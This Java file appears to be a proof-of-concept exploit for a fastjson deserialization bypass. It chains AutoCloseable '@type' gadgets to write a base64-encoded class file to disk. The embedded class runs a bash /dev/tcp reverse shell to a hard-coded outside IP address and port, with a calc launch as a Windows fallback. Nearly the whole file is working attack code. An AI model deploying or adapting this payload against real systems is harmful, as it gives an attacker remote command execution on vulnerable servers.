package com.firebasky.fastjsonbypass.Test;

import com.alibaba.fastjson.JSON;

public class test {
    public static void main(String[] args) {
        String poc ="{\n" +
                "    \"stream\": {\n" +
                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
                "        \"@type\": \"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\n" +
                "        \"targetPath\": \"d:/2.txt\",\n" +
                "        \"tempPath\": \"\"\n" +
                "    },\n" +
                "    \"writer\": {\n" +
                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
                "        \"@type\": \"com.esotericsoftware.kryo.io.Output\",\n" +
                "        \"buffer\": \"yv66vgAAADQAMAoADQAbCgAcAB0HAB4IAB8IACAIACEKABwAIgcAIwgAJAgAJQgAJgcAJwcAKAcAKQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAVjbG9zZQEACkV4Y2VwdGlvbnMHACoBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHACMBAApTb3VyY2VGaWxlAQAIQ21kLmphdmEMAA8AEAcAKwwALAAtAQAQamF2YS9sYW5nL1N0cmluZwEACS9iaW4vYmFzaAEAAi1jAQBWZXhlYyA1PD4vZGV2L3RjcC8xLjExNi4xMzYuMTIwLzIzMzM7Y2F0IDwmNSB8IHdoaWxlIHJlYWQgbGluZTsgZG8gJGxpbmUgMj4mNSA+JjU7IGRvbmUMAC4ALwEAE2phdmEvaW8vSU9FeGNlcHRpb24BAANjbWQBAAIvYwEABGNhbGMBAANDbWQBABBqYXZhL2xhbmcvT2JqZWN0AQAXamF2YS9sYW5nL0F1dG9DbG9zZWFibGUBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAMAA0AAQAOAAAAAwABAA8AEAABABEAAAAdAAEAAQAAAAUqtwABsQAAAAEAEgAAAAYAAQAAAAIAAQATABAAAgARAAAAGQAAAAEAAAABsQAAAAEAEgAAAAYAAQAAABAAFAAAAAQAAQAVAAgAFgAQAAEAEQAAAJkABQACAAAAPbgAAga9AANZAxIEU1kEEgVTWQUSBlO2AAdXpwAiS7gAAga9AANZAxIJU1kEEgpTWQUSC1O2AAdXpwAETLEAAgAAABoAHQAIAB4AOAA7AAgAAgASAAAAHgAHAAAABQAaAAsAHQAGAB4ACAA4AAoAOwAJADwADAAXAAAAFgADXQcAGP8AHQABBwAYAAEHABj6AAAAAQAZAAAAAgAa\",\n" +
                "        \"outputStream\": {\n" +
                "            \"$ref\": \"$.stream\"\n" +
                "        },\n" +
                "        \"position\": 822\n" +//通过wc 可以统计
                "    },\n" +
                "    \"close\": {\n" +
                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
                "        \"@type\": \"com.sleepycat.bind.serial.SerialOutput\",\n" +
                "        \"out\": {\n" +
                "            \"$ref\": \"$.writer\"\n" +
                "        }\n" +
                "    }\n" +
                "}";
        JSON.parseObject(poc);
    }
}
